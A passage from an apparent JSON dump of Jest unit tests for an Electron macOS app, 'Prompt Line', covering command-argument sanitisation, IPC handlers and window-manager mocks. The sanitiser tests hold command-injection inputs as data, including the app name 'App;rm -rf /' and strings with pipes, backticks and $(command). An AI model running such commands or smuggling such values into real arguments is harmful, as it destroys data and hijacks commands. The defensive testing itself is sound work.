com.example.app-name_test';\n                const sanitized = sanitizeCommandArgument(safeInput);\n                \n                expect(sanitized).toBe(safeInput);\n            });\n\n            test('should remove null bytes and newlines', () => {\n                const dangerous = 'app\\x00name\\r\\nmalicious';\n                const sanitized = sanitizeCommandArgument(dangerous);\n                \n                expect(sanitized).toBe('appnamemalicious');\n                expect(sanitized).not.toContain('\\x00');\n                expect(sanitized).not.toContain('\\r');\n                expect(sanitized).not.toContain('\\n');\n            });\n\n            test('should truncate long inputs', () => {\n                const longInput = 'a'.repeat(300);\n                const sanitized = sanitizeCommandArgument(longInput, 100);\n                \n                expect(sanitized.length).toBe(100);\n            });\n\n            test('should trim whitespace', () => {\n                const input = '  MyApp  ';\n                const sanitized = sanitizeCommandArgument(input);\n                \n                expect(sanitized).toBe('MyApp');\n            });\n\n            test('should throw error for non-string input', () => {\n                expect(() => sanitizeCommandArgument(null as any)).toThrow('Input must be a string');\n                expect(() => sanitizeCommandArgument(123 as any)).toThrow('Input must be a string');\n                expect(() => sanitizeCommandArgument(undefined as any)).toThrow('Input must be a string');\n            });\n        });\n\n        describe('isCommandArgumentSafe', () => {\n            test('should return false for dangerous characters', () => {\n                const dangerousInputs = [\n                    'app;malicious',\n                    'app|evil',\n                    'app`command`',\n                    'app$(command)',\n                    'app{expansion}',\n                    'app[glob]',\n                    'app<"+"redirect',\n                    'app>redirect',\n                    'app\"quoted',\n                    \"app'quoted\",\n                    'app\\\\escaped',\n                    'app*glob',\n                    'app?glob',\n                    'app~home',\n                    'app^caret',\n                    'app\\x00null',\n                    'app\\nnewline',\n                    'app\\rcarriage',\n                    '-flag-starting-input',\n                    'app../traversal'\n                ];\n\n                dangerousInputs.forEach(input => {\n                    expect(isCommandArgumentSafe(input)).toBe(false);\n                });\n            });\n\n            test('should return true for safe inputs', () => {\n                const safeInputs = [\n                    'MyApp',\n                    'com.example.app',\n                    'App Name 1.2.3',\n                    'app_name',\n                    'app-name',\n                    'App.Name',\n                    'Simple App',\n                    'App123'\n                ];\n\n                safeInputs.forEach(input => {\n                    expect(isCommandArgumentSafe(input)).toBe(true);\n                });\n            });\n\n            test('should return false for non-string input', () => {\n                expect(isCommandArgumentSafe(null as any)).toBe(false);\n                expect(isCommandArgumentSafe(123 as any)).toBe(false);\n                expect(isCommandArgumentSafe(undefined as any)).toBe(false);\n            });\n        });\n\n        describe('activateAndPasteWithNativeTool security', () => {\n            test('should reject dangerous app names', async () => {\n                const originalPlatform = process.platform;\n                Object.defineProperty(process, 'platform', { value: 'darwin' });\n\n                // Mock exec to never be called due to validation rejection\n                (mockedExec as any).mockImplementation(() => {\n                    throw new Error('Should not reach exec call');\n                });\n\n                const dangerousAppName = 'App;rm -rf /';\n\n                await expect(\n                    activateAndPasteWithNativeTool(dangerousAppName)\n                ).rejects.toThrow('App name contains unsafe characters');\n\n                Object.defineProperty(process, 'platform', { value: originalPlatform });\n            });\n\n            test('should reject dangerous bundle IDs', async () => {\n                const originalPlatform = process.platform;\n                Object.defineProperty(process, 'platform', { value: 'darwin' });\n\n                // Mock exec to never be called due to validation rejection\n                (mockedExec as any).mockImplementation(() => {\n                    throw new Error('Should not reach exec call');\n                });\n\n                const dangerousAppInfo = {\n                    name: 'SafeApp',\n                    bundleId: 'com.example.app;malicious'\n                };\n\n                await expect(\n                    activateAndPasteWithNativeTool(dangerousAppInfo)\n                ).rejects.toThrow('Bundle ID contains unsafe characters');\n\n                Object.defineProperty(process, 'platform', { value: originalPlatform });\n            });\n\n            test('should reject empty app name after sanitization', async () => {\n                const originalPlatform = process.platform;\n                Object.defineProperty(process, 'platform', { value: 'darwin' });\n\n                const emptyAfterSanitization = ';|`$(){}[]<"+">\"\\'\\\\*?~^';\n\n                await expect(\n                    activateAndPasteWithNativeTool(emptyAfterSanitization)\n                ).rejects.toThrow('App name contains unsafe characters');\n\n                Object.defineProperty(process, 'platform', { value: originalPlatform });\n            });\n\n            test('should accept safe app info', async () => {\n                const originalPlatform = process.platform;\n                Object.defineProperty(process, 'platform', { value: 'darwin' });\n\n                // Mock execFile to simulate successful execution\n                (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback: ExecCallback) => {\n                    callback(null, '{\"success\":true,\"command\":\"activate-and-paste-name\"}', '');\n                    return null as any;\n                });\n\n                const safeAppInfo = {\n                    name: 'MyApp',\n                    bundleId: 'com.example.app'\n                };\n\n                await expect(\n                    activateAndPasteWithNativeTool(safeAppInfo)\n                ).resolves.toBeUndefined();\n\n                // Verify that execFile was called with the correct arguments\n                // Bundle ID is provided, so it should use activate-and-paste-bundle command\n                expect(mockedExec).toHaveBeenCalledWith(\n                    expect.any(String), // file path\n                    expect.arrayContaining(['activate-and-paste-bundle']), // args array\n                    expect.any(Object), // options\n                    expect.any(Function) // callback\n                );\n\n                Object.defineProperty(process, 'platform', { value: originalPlatform });\n            });\n        });\n    });\n});"},"tests/unit/ipc-handlers.test.ts":{"tests":[{"id":"99","name":"IPCHandlers initialization should register all IPC handlers","location":{"start":{"column":14,"line":163}}},{"id":"100","name":"IPCHandlers handlePasteText should handle successful paste operation","location":{"start":{"column":14,"line":174}}},{"id":"101","name":"IPCHandlers handlePasteText should handle empty text","location":{"start":{"column":14,"line":192}}},{"id":"102","name":"IPCHandlers handlePasteText should handle paste errors gracefully","location":{"start":{"column":14,"line":203}}},{"id":"103","name":"IPCHandlers handlePasteText should handle focus app failure","location":{"start":{"column":14,"line":218}}},{"id":"104","name":"IPCHandlers handlePasteText should clear draft when paste is successful","location":{"start":{"column":14,"line":234}}},{"id":"105","name":"IPCHandlers handlePasteText should clear draft even when paste fails","location":{"start":{"column":14,"line":251}}},{"id":"106","name":"IPCHandlers handlePasteText should not clear draft when text is empty","location":{"start":{"column":14,"line": tory-manager';\nimport type DraftManager from '../../src/managers/draft-manager';\n\n// Mock dependencies\nconst mockWindowManager: jest.Mocked<"+"WindowManager> = {\n    hideInputWindow: jest.fn(),\n    showInputWindow: jest.fn(),\n    focusPreviousApp: jest.fn(() => Promise.resolve(true)),\n    getInputWindow: jest.fn(),\n    getPreviousApp: jest.fn(() => ({ name: 'TestApp', bundleId: 'com.test.app' })),\n    isVisible: jest.fn(() => false),\n    createInputWindow: jest.fn(),\n    repositionWindow: jest.fn(),\n    registerShortcuts: jest.fn(),\n    unregisterShortcuts: jest.fn(),\n    destroy: jest.fn()\n} as any;\n\nconst mockHistoryManager: jest.Mocked<"+"HistoryManager> = {\n    addToHistory: jest.fn(() => Promise.resolve({ id: 'test-id', text: 'test', timestamp: Date.now() })),\n    getHistory: jest.fn(() => []),\n    clearHistory: jest.fn(() => Promise.resolve()),\n    removeHistoryItem: jest.fn(() => Promise.resolve(true)),\n    searchHistory: jest.fn(() => []),\n    getHistoryStats: jest.fn(() => ({\n        totalItems: 0,\n        totalCharacters: 0,\n        averageLength: 0,\n        oldestTimestamp: null,\n        newestTimestamp: null,\n        maxItems: 50\n    })),\n    initialize: jest.fn(),\n    getHistoryItem: jest.fn(),\n    getRecentHistory: jest.fn(),\n    exportHistory: jest.fn(),\n    importHistory: jest.fn()\n} as any;\n\nconst mockDraftManager: jest.Mocked<"+"DraftManager> = {\n    saveDraft: jest.fn(() => Promise.resolve()),\n    saveDraftImmediately: jest.fn(() => Promise.resolve()),\n    clearDraft: jest.fn(() => Promise.resolve()),\n    getCurrentDraft: jest.fn(() => ''),\n    getDraftStats: jest.fn(() => ({ hasContent: false, length: 0, wordCount: 0, lineCount: 0 })),\n    initialize: jest.fn(),\n    hasDraft: jest.fn(),\n    getDraftMetadata: jest.fn(),\n    updateDraft: jest.fn(),\n    backupDraft: jest.fn(),\n    restoreDraft: jest.fn(),\n    cleanupBackups: jest.fn(),\n    destroy: jest.fn(),\n    setDirectory: jest.fn(),\n    getDirectory: jest.fn(() => null)\n} as any;\n\n// Mock utils\njest.mock('../../src/utils/utils', () => ({\n    logger: {\n        info: jest.fn(),\n        debug: jest.fn(),\n        warn: jest.fn(),\n        error: jest.fn()\n    },\n    pasteWithNativeTool: jest.fn(() => Promise.resolve()),\n    activateAndPasteWithNativeTool: jest.fn(() => Promise.resolve()),\n    sleep: jest.fn(() => Promise.resolve()),\n    SecureErrors: {\n        INVALID_INPUT: 'Invalid input provided',\n        OPERATION_FAILED: 'Operation failed',\n        FILE_NOT_FOUND: 'File not found',\n        PERMISSION_DENIED: 'Permission denied',\n        INTERNAL_ERROR: 'An internal error occurred',\n        INVALID_FORMAT: 'Invalid format',\n        SIZE_LIMIT_EXCEEDED: 'Size limit exceeded'\n    },\n    checkAccessibilityPermission: jest.fn(() => Promise.resolve({ hasPermission: true, bundleId: 'test' }))\n}));\n\n// Mock config\njest.mock('../../src/config/app-config', () => ({\n    timing: {\n        windowHideDelay: 100,\n        appFocusDelay: 200\n    },\n    platform: {\n        isMac: true\n    },\n    app: {\n        name: 'Prompt Line',\n        version: '1.0.0',\n        description: 'Test app'\n    },\n    shortcuts: { main: 'Cmd+Shift+Space' },\n    history: { maxItems: 50 },\n    draft: { saveDelay: 500 },\n    isDevelopment: jest.fn(() => false),\n    get: jest.fn((key: string) => {\n        const config: any = {\n            timing: { windowHideDelay: 100, appFocusDelay: 200 },\n            platform: { isMac: true },\n            app: { name: 'Prompt Line', version: '1.0.0', description: 'Test app' },\n            shortcuts: { main: 'Cmd+Shift+Space' },\n            history: { maxItems: 50 },\n            draft: { saveDelay: 500 }\n        };\n        return config[key];\n    })\n}));\n\nconst { logger, pasteWithNativeTool, activateAndPasteWithNativeTool } = jest.requireMock('../../src/utils/utils') as any;\n\n/**\n * Helper function to get a registered IPC handler from the mock\n * After IPCHandlers is instantiated, we can retrieve handlers from ipcMain.handle mock calls\n */\ntype HandlerFunction = (event: any, ...args: any[]) => Promise<"+"any>;\nfunction getHandler(channel: string): HandlerFunction | null {\n    const calls = (ipcMain.handle as jest.Mock).mock.calls as [string, HandlerFunction][];\n    const call = calls.find((c) => c[0] === channel);\n    return call ? call[1] : null;\n}\n\ndescribe('IPCHandlers', () => {\n    let ipcHandlers: IPCHandlers;\n    let mockSettingsManager: any;\n    let mockDirectoryManager: any;\n\n    beforeEach(() => {\n        jest.clearAllMocks();\n        (ipcMain.handle as jest.Mock).mockClear();\n\n        mockSettingsManager = {\n            getSettings: jest.fn(() => ({\n                shortcuts: { main: 'Ctrl+Space', paste: 'Enter', close: 'Escape' },\n                window: { position: 'cursor', width: 600, height: 300 }\n            })),\n            updateSettings: jest.fn(),\n            resetSettings: jest.fn()\n        };\n\n        mockDirectoryManager = {\n            getDirectory: jest.fn(() => null),\n            setDirectory: jest.fn(),\n            saveDirectory: jest.fn()\n        };\n\n        ipcHandlers = new IPCHandlers(\n            mockWindowManager,\n            mockHistoryManager,\n            mockDraftManager,\n            mockDirectoryManager,\n            mockSettingsManager\n        );\n    });\n\n    describe('initialization', () => {\n        test('should register all IPC handlers', () => {\n            expect(ipcMain.handle).toHaveBeenCalledWith('paste-text', expect.any(Function));\n            expect(ipcMain.handle).toHaveBeenCalledWith('get-history', expect.any(Function));\n            expect(ipcMain.handle).toHaveBeenCalledWith('clear-history', expect.any(Function));\n            expect(ipcMain.handle).toHaveBeenCalledWith('save-draft', expect.any(Function));\n            expect(ipcMain.handle).toHaveBeenCalledWith('hide-window', expect.any(Function));\n            expect(logger.info).toHaveBeenCalledWith('All IPC handlers set up successfully via coordinator');\n        });\n    });\n\n    describe('handlePasteText', () => {\n        test('should handle successful paste operation', async () => {\n            const handler = getHandler('paste-text');\n            expect(handler).not.toBeNull();\n\n            (clipboard.writeText as jest.Mock).mockImplementation(() => {});\n            mockWindowManager.hideInputWindow.mockResolvedValue();\n            mockWindowManager.focusPreviousApp.mockResolvedValue(true);\n            activateAndPasteWithNativeTool.mockResolvedValue();\n\n            const result = await handler!(null, 'test text');\n\n            expect(result.success).toBe(true);\n            expect(mockHistoryManager.addToHistory).toHaveBeenCalledWith('test text', 'TestApp', undefined);\n            expect(mockDraftManager.clearDraft).toHaveBeenCalled();\n            expect(clipboard.writeText).toHaveBeenCalledWith('test text');\n            expect(mockWindowManager.hideInputWindow).toHaveBeenCalled();\n        });\n\n        test('should handle empty text', async () => {\n            const handler = getHandler('paste-text');\n            expect(handler).not.toBeNull();\n\n            const result = await handler!(null, '   ');\n\n            expect(result.success).toBe(false);\n            expect(result.error).toBe('Invalid input provided');\n            expect(mockHistoryManager.addToHistory).not.toHaveBeenCalled();\n        });\n\n        test('should handle paste errors gracefully', async () => {\n            const handler = getHandler('paste-text');\n            expect(handler).not.toBeNull();\n\n            (clipboard.writeText as jest.Mock).mockImplementation(() => {});\n            mockWindowManager.hideInputWindow.mockResolvedValue();\n            mockWindowManager.getPreviousApp.mockReturnValue({ name: 'TestApp', bundleId: 'com.test.app' });\n            activateAndPasteWithNativeTool.mockRejectedValue(new Error('Paste failed'));\n\n            const result = await handler!(null, 'test text');\n\n            expect(result.success).toBe(false);\n            expect(result.error).toBe('Operation failed');\n        });\n\n        test('should handle focus app failure', async () => {\n            const handler = getHandler('paste-text');\n            expect(handler).not.toBeNull();\n\n            (clipboard.writeText as jest.Mock).mockImplementation(() => {});\n            mockWindowManager.hideInputWindow.mockResolvedValue();\n            mockWindowManager.getPreviousApp.mockReturnValue(null); // No previous app\n            mockWindowManager.focusPreviousApp.mockResolvedValue(false);\n            pasteWithNativeTool.mockResolvedValue();\n\n            const result = await handler!(null, 'test text');\n\n            expect(result.success).toBe(true);\n            expect(result.warning).toBe('Could not focus previous application');\n        });\n\n        test('should clear draft when paste is successful', async () => {\n            const handler = getHandler('paste-text');\n            expect(handler).not.toBeNull();\n\n            (clipboard.writeText as jest.Mock).mockImplementation(() => {});\n            mockWindowManager.hideInputWindow.mockResolvedValue();\n            mockWindowManager.focusPreviousApp.mockResolvedValue(true);\n            pasteWithNativeTool.mockResolvedValue();\n            // Reset getPreviousApp to return the default mock value\n            mockWindowManager.getPreviousApp.mockReturnValue({ name: 'TestApp', bundleId: 'com.test.app' });\n\n            await handler!(null, 'test text');\n\n            expect(mockDraftManager.clearDraft).toHaveBeenCalledTimes(1);\n            expect(mockHistoryManager.addToHistory).toHaveBeenCalledWith('test text', 'TestApp', undefined);\n        });\n\n        test('should clear draft even when paste fails', async () => {\n            const handler = getHandler('paste-text');\n            expect(handler).not.toBeNull();\n\n            (clipboard.writeText as jest.Mock).mockImplementation(() => {});\n            mockWindowManager.hideInputWindow.mockResolvedValue();\n            mockWindowManager.focusPreviousApp.mockResolvedValue(true);\n            pasteWithNativeTool.mockRejectedValue(new Error('Paste script failed'));\n            // Reset getPreviousApp to return the default mock value\n            mockWindowManager.getPreviousApp.mockReturnValue({ name: 'TestApp', bundleId: 'com.test.app' });\n\n            const result = await handler!(null, 'test text');\n\n            expect(result.success).toBe(false);\n            expect(mockDraftManager.clearDraft).toHaveBeenCalledTimes(1);\n            expect(mockHistoryManager.addToHistory).toHaveBeenCalledWith('test text', 'TestApp', undefined);\n        });\n\n        test('should not clear draft when text is empty', async () => {\n            const handler = getHandler('paste-text');\n            expect(handler).not.toBeNull();\n\n            const result = await handler!(null, '   ');\n\n            expect(result.success).toBe(false);\n            expect(result.error).toBe('Invalid input provided');\n            expect(mockDraftManager.clearDraft).not.toHaveBeenCalled();\n            expect(mockHistoryManager.addToHistory).not.toHaveBeenCalled();\n        });\n    });\n\n    describe('handleGetHistory', () => {\n        test('should return history from manager', async () => {\n            const handler = getHandler('get-history');\n            expect(handler).not.toBeNull();\n\n            const testHistory = [{ text: 'test', timestamp: Date.now(), id: 'test-id' }];\n            mockHistoryManager.getHistory.mockReturnValue(testHistory);\n\n            const result = await handler!(null);\n\n            expect(result).toEqual(testHistory);\n            expect(mockHistoryManager.getHistory).toHaveBeenCalled();\n        });\n\n        test('should handle errors gracefully', async () => {\n            const handler = getHandler('get-history');\n            expect(handler).not.toBeNull();\n\n            mockHistoryManager.getHistory.mockImplementation(() => {\n                throw new Error('History error');\n            });\n\n            const result = await handler!(null);\n\n            expect(result).toEqual([]);\n            expect(logger.error).toHaveBeenCalled();\n        });\n    });\n\n    describe('handleClearHistory', () => {\n        test('should clear history successfully', async () => {\n            const handler = getHandler('clear-history');\n            expect(handler).not.toBeNull();\n\n            mockHistoryManager.clearHistory.mockResolvedValue();\n\n            const result = await handler!(null);\n\n            expect(result.success).toBe(true);\n            expect(mockHistoryManager.clearHistory).toHaveBeenCalled();\n        });\n\n        test('should handle clear history errors', async () => {\n            const handler = getHandler('clear-history');\n            expect(handler).not.toBeNull();\n\n            mockHistoryManager.clearHistory.mockRejectedValue(new Error('Clear failed'));\n\n            const result = await handler!(null);\n\n            expect(result.success).toBe(false);\n            expect(result.error).toBe('Operation failed');\n        });\n    });\n\n    describe('handleRemoveHistoryItem', () => {\n        test('should remove history item successfully', async () => {\n            const handler = getHandler('remove-history-item');\n            expect(handler).not.toBeNull();\n\n            mockHistoryManager.removeHistoryItem.mockResolvedValue(true);\n\n            const result = await handler!(null, 'testid123');\n\n            expect(result.success).toBe(true);\n            expect(mockHistoryManager.removeHistoryItem).toHaveBeenCalledWith('testid123');\n        });\n\n        test('should handle item not found', async () => {\n            const handler = getHandler('remove-history-item');\n            expect(handler).not.toBeNull();\n\n            mockHistoryManager.removeHistoryItem.mockResolvedValue(false);\n\n            const result = await handler!(null, 'non-existent');\n\n            expect(result.success).toBe(false);\n        });\n    });\n\n    describe('handleSearchHistory', () => {\n        test('should search history with query', async () => {\n            const handler = getHandler('search-history');\n            expect(handler).not.toBeNull();\n\n            const searchResults = [{ text: 'matching text', timestamp: Date.now(), id: 'match-1' }];\n            mockHistoryManager.searchHistory.mockReturnValue(searchResults);\n\n            const result = await handler!(null, 'matching', 5);\n\n            expect(result).toEqual(searchResults);\n            expect(mockHistoryManager.searchHistory).toHaveBeenCalledWith('matching', 5);\n        });\n\n        test('should use default limit when not provided', async () => {\n            const handler = getHandler('search-history');\n            expect(handler).not.toBeNull();\n\n            mockHistoryManager.searchHistory.mockReturnValue([]);\n\n            await handler!(null, 'query');\n\n            expect(mockHistoryManager.searchHistory).toHaveBeenCalledWith('query', 10);\n        });\n    });\n\n    describe('handleSaveDraft', () => {\n        test('should save draft normally', async () => {\n            const handler = getHandler('save-draft');\n            expect(handler).not.toBeNull();\n\n            const result = await handler!(null, 'test draft', false);\n\n            expect(result.success).toBe(true);\n            expect(mockDraftManager.saveDraft).toHaveBeenCalledWith('test draft');\n            expect(mockDraftManager.saveDraftImmediately).not.toHaveBeenCalled();\n        });\n\n        test('should save draft immediately when requested', async () => {\n            const handler = getHandler('save-draft');\n            expect(handler).not.toBeNull();\n\n            const result = await handler!(null, 'test draft', true);\n\n            expect(result.success).toBe(true);\n            expect(mockDraftManager.saveDraftImmediately).toHaveBeenCalledWith('test draft');\n            expect(mockDraftManager.saveDraft).not.toHaveBeenCalled();\n        });\n\n        test('should handle save draft errors', async () => {\n            const handler = getHandler('save-draft');\n            expect(handler).not.toBeNull();\n\n            mockDraftManager.saveDraft.mockRejectedValue(new Error('Save failed'));\n\n            const result = await handler!(null, 'test draft');\n\n            expect(result.success).toBe(false);\n            expect(result.error).toBe('Operation failed');\n        });\n    });\n\n    describe('handleClearDraft', () => {\n        test('should clear draft successfully', async () => {\n            const handler = getHandler('clear-draft');\n            expect(handler).not.toBeNull();\n\n            const result = await handler!(null);\n\n            expect(result.success).toBe(true);\n            expect(mockDraftManager.clearDraft).toHaveBeenCalled();\n        });\n    });\n\n    describe('handleGetDraft', () => {\n        test('should return current draft', async () => {\n            const handler = getHandler('get-draft');\n            expect(handler).not.toBeNull();\n\n            mockDraftManager.getCurrentDraft.mockReturnValue('current draft');\n\n            const result = await handler!(null);\n\n            expect(result).toBe('current draft');\n        });\n\n        test('should handle errors gracefully', async () => {\n            const handler = getHandler('get-draft');\n            expect(handler).not.toBeNull();\n\n            mockDraftManager.getCurrentDraft.mockImplementation(() => {\n                throw new Error('Draft error');\n            });\n\n            const result = await handler!(null);\n\n            expect(result).toBe('');\n        });\n    });\n\n    describe('handleHideWindow', () => {\n        test('should hide window successfully', async () => {\n            const handler = getHandler('hide-window');\n            expect(handler).not.toBeNull();\n\n            const result = await handler!(null);\n\n            expect(result.success).toBe(true);\n            expect(mockWindowManager.hideInputWindow).toHaveBeenCalled();\n        });\n\n        test('should focus previous app after hiding window on macOS', async () => {\n            const handler = getHandler('hide-window');\n            expect(handler).not.toBeNull();\n\n            const { sleep } = jest.requireMock('../../src/utils/utils') as any;\n\n            const result = await handler!(null);\n\n            expect(result.success).toBe(true);\n            expect(mockWindowManager.hideInputWindow).toHaveBeenCalled();\n            expect(sleep).toHaveBeenCalledWith(100); // Using config.timing.windowHideDelay\n            expect(mockWindowManager.focusPreviousApp).toHaveBeenCalled();\n        });\n\n        test('should handle errors when focusing previous app fails', async () => {\n            const handler = getHandler('hide-window');\n            expect(handler).not.toBeNull();\n\n            mockWindowManager.focusPreviousApp.mockRejectedValue(new Error('Focus failed'));\n\n            const result = await handler!(null);\n\n            expect(result.success).toBe(true); // Should still succeed even if focus fails\n            expect(mockWindowManager.hideInputWindow).toHaveBeenCalled();\n            expect(mockWindowManager.focusPreviousApp).toHaveBeenCalled();\n            expect(result.error).toBeUndefined(); // Error should be caught silently\n        });\n\n        test('should not focus previous app when restoreFocus is false', async () => {\n            const handler = getHandler('hide-window');\n            expect(handler).not.toBeNull();\n\n            const result = await handler!(null, false);\n\n            expect(result.success).toBe(true);\n            expect(mockWindowManager.hideInputWindow).toHaveBeenCalled();\n            expect(mockWindowManager.focusPreviousApp).not.toHaveBeenCalled();\n        });\n\n        test('should focus previous app when restoreFocus is explicitly true', async () => {\n            const handler = getHandler('hide-window');\n            expect(handler).not.toBeNull();\n\n            const { sleep } = jest.requireMock('../../src/utils/utils') as any;\n\n            const result = await handler!(null, true);\n\n            expect(result.success).toBe(true);\n            expect(mockWindowManager.hideInputWindow).toHaveBeenCalled();\n            expect(sleep).toHaveBeenCalledWith(100);\n            expect(mockWindowManager.focusPreviousApp).toHaveBeenCalled();\n        });\n    });\n\n    describe('handleShowWindow', () => {\n        test('should show window with data', async () => {\n            const handler = getHandler('show-window');\n            expect(handler).not.toBeNull();\n\n            const testData = { history: [], draft: '' };\n\n            const result = await handler!(null, testData);\n\n            expect(result.success).toBe(true);\n            expect(mockWindowManager.showInputWindow).toHaveBeenCalledWith(testData);\n        });\n\n        test('should pass settings to window when provided', async () => {\n            const handler = getHandler('show-window');\n            expect(handler).not.toBeNull();\n\n            mockWindowManager.showInputWindow.mockResolvedValue();\n\n            const windowData = {\n                history: [{ text: 'test', timestamp: Date.now(), id: 'test-1' }],\n                settings: {\n                    shortcuts: { main: 'Cmd+Space', paste: 'Enter', close: 'Escape', historyNext: 'ArrowDown', historyPrev: 'ArrowUp', search: 'Cmd+f' },\n                    window: { position: 'cursor' as const, width: 800, height: 400 }\n                }\n            };\n\n            const result = await handler!(null, windowData);\n\n            expect(result.success).toBe(true);\n            expect(mockWindowManager.showInputWindow).toHaveBeenCalledWith(windowData);\n        });\n\n        test('should handle show window errors', async () => {\n            const handler = getHandler('show-window');\n            expect(handler).not.toBeNull();\n\n            mockWindowManager.showInputWindow.mockRejectedValue(new Error('Show failed'));\n\n            const result = await handler!(null, {});\n\n            expect(result.success).toBe(false);\n            expect(result.error).toBe('Show failed');\n        });\n    });\n\n    describe('handleGetAppInfo', () => {\n        test('should return application information', async () => {\n            const handler = getHandler('get-app-info');\n            expect(handler).not.toBeNull();\n\n            const result = await handler!(null);\n\n            expect(result).toEqual(expect.objectContaining({\n                name: 'Prompt Line',\n                version: '1.0.0',\n                platform: process.platform,\n                electronVersion: process.versions.electron,\n                nodeVersion: process.versions.node,\n                isDevelopment: false\n            }));\n        });\n    });\n\n    describe('handleGetConfig', () => {\n        test('should return full safe config when no section specified', async () => {\n            const handler = getHandler('get-config');\n            expect(handler).not.toBeNull();\n\n            const result = await handler!(null);\n\n            expect(result).toHaveProperty('shortcuts');\n            expect(result).toHaveProperty('history');\n            expect(result).toHaveProperty('draft');\n            expect(result).toHaveProperty('timing');\n            expect(result).toHaveProperty('app');\n            expect(result).toHaveProperty('platform');\n        });\n\n        test('should return specific config section', async () => {\n            const handler = getHandler('get-config');\n            expect(handler).not.toBeNull();\n\n            const config = jest.requireMock('../../src/config/app-config') as any;\n            config.get = jest.fn(() => ({ maxItems: 50 }));\n\n            const result = await handler!(null, 'history');\n\n            expect(config.get).toHaveBeenCalledWith('history');\n            expect(result).toEqual({ maxItems: 50 });\n        });\n    });\n\n    describe('removeAllHandlers', () => {\n        test('should remove all registered handlers', () => {\n            (ipcMain.removeAllListeners as jest.Mock).mockClear();\n\n            ipcHandlers.removeAllHandlers();\n\n            // Should be called for each handler (count: 27 handlers)\n            // paste-handler: 2, window-handler: 3, history-draft-handler: 9\n            // system-handler: 4, file-handler: 3, mdsearch-handler: 6\n            expect(ipcMain.removeAllListeners).toHaveBeenCalledTimes(27);\n            expect(logger.info).toHaveBeenCalledWith('All IPC handlers removed via coordinator');\n        });\n    });\n\n    describe('getHandlerStats', () => {\n        test('should return handler statistics', () => {\n            (ipcMain.eventNames as jest.Mock).mockReturnValue(['paste-text', 'get-history', 'hide-window']);\n\n            const stats = ipcHandlers.getHandlerStats();\n\n            expect(stats).toEqual({\n                totalHandlers: 3,\n                registeredHandlers: ['paste-text', 'get-history', 'hide-window'],\n                timestamp: expect.any(Number)\n            });\n        });\n    });\n});\n"},"tests/unit/window-manager.test.ts":{"tests":[{"id":"134","name":"WindowManager createInputWindow should create a BrowserWindow with correct configuration","location":{"start":{"column":14,"line":120}}},{"id":"135","name":"WindowManager createInputWindow should set up event listeners on the window","location":{"start":{"column":14,"line":136}}},{"id":"136","name":"WindowManager createInputWindow should handle window creation errors","location":{"start":{"column":14,"line":142}}},{"id":"137","name":"WindowManager showInputWindow should show window and send data to renderer","location":{"start":{"column":14,"line":163}}},{"id":"138","name":"WindowManager showInputWindow should create window if it does not exist","location":{"start":{"column":14,"line":189}}},{"id":"139","name":"WindowManager showInputWindow should position window at cursor location","location":{"start":{"column":14,"line":198}}},{"id":"140","name":"WindowManager showInputWindow should keep window within screen bounds","location":{"start":{"column":14,"line":212}}},{"id":"141","name":"WindowManager showInputWindow should handle errors gracefully","location":{"start":{"column":14,"line":228}}},{"id":"142","name":"WindowManager hideInputWindow should hide visible window","location":{"start":{"column":14,"line":245}}},{"id":"143","name":"WindowManager hideInputWindow should not hide if window is not visible","location":{"start":{"column":14,"line":251}}},{"id":"144","name":"WindowManager hideInputWindow should handle case when window does not exist","location":{"start":{"column":14,"line":259}}},{"id":"145","name":"WindowManager focusPreviousApp should focus previous app on macOS","location":{"start":{"column":14,"line":277}}},{"id":"146","name":"WindowManager focusPreviousApp should return false when no previous app","location":{"start":{"column":14,"line":294}}},{"id":"147","name":"WindowManager focusPreviousApp should return false on non-macOS platforms","location":{"start":{"column":14,"line":302}}},{"id":"148","name":"WindowManager focusPreviousApp should handle native tool errors","location":{"start":{"column":14,"line":311}}},{"id":"149","name":"WindowManager focusPreviousApp should handle native tool failure response","location":{"start":{"column":14,"line":322}}},{"id":"150","name":"WindowManager focusPreviousApp should focus app with bundle ID","location":{"start":{"column":14,"line":333}}},{"id":"151","name":"WindowManager focusPreviousApp should handle invalid JSON response","location":{"start":{"column":14,"line":352}}},{"id":"152","name":"WindowManager getInputWindow should return the input window instance","location":{"start":{"column":14,"line":365}}},{"id":"153","name":"WindowManager getInputWindow should return null when no window exists","location":{"start":{"column":14,"line":373}}},{"id":"154","name":"WindowManager getPreviousApp should return the previous app name","location":{"start":{"column":14,"line":381}}},{"id":"155","name":"WindowManager getPreviousApp should return null when no previous app","location":{"start":{"column":14,"line":389}}},{"id":"156","name":"WindowManager destroy should destroy the window if it exists","location":{"start":{"column":14,"line":397}}},{"id":"157","name":"WindowManager destroy should handle case when window does not exist","location":{"start":{"column":14,"line":406}}},{"id":"158","name":"WindowManager destroy should handle destruction errors","location":{"start":{"column":14,"line":413}}},{"id":"159","name":"WindowManager isVisible should return true when window is visible","location":{"start":{"column":14,"line":426}}},{"id":"160","name":"WindowManager isVisible should return false when window is not visible","location":{"start":{"column":14,"line":435}}},{"id":"161","name":"WindowManager isVisible should return false when no window exists","location":{"start":{"column":14,"line":444}}},{"id":"162","name":"WindowManager setupEventListeners should set up event listeners when window exists","location":{"start":{"column":14,"line":452}}},{"id":"163","name":"WindowManager setupEventListeners should handle case when window does not exist","location":{"start":{"column":14,"line":463}}},{"id":"164","name":"WindowManager setupEventListeners should work with null callbacks","location":{"start":{"column":14,"line":472}}}],"source":"import { describe, test, expect, beforeEach, jest } from '@jest/globals';\nimport WindowManager from '../../src/managers/window';\nimport { BrowserWindow, screen } from 'electron';\ntype ExecCallback = (error: Error | null, stdout: string, stderr: string) => void;\n\n// Mock child_process\njest.mock('child_process', () => ({\n    exec: jest.fn(),\n    execFile: jest.fn()\n}));\n\n// Mock the utils module\njest.mock('../../src/utils/utils', () => ({\n    getCurrentApp: jest.fn(),\n    getActiveWindowBounds: jest.fn(() => Promise.resolve(null)),\n    logger: {\n        info: jest.fn(),\n        debug: jest.fn(),\n        warn: jest.fn(),\n        error: jest.fn()\n    },\n    KEYBOARD_SIMULATOR_PATH: '/path/to/keyboard-simulator',\n    TEXT_FIELD_DETECTOR_PATH: '/path/to/text-field-detector',\n    WINDOW_DETECTOR_PATH: '/path/to/window-detector',\n    DIRECTORY_DETECTOR_PATH: '/path/to/directory-detector'\n}));\n\n// Mock the config module\njest.mock('../../src/config/app-config', () => ({\n    window: {\n        width: 600,\n        height: 300,\n        frame: false,\n        transparent: true,\n        alwaysOnTop: true,\n        skipTaskbar: true,\n        resizable: false,\n        webPreferences: {\n            nodeIntegration: true,\n            contextIsolation: false\n        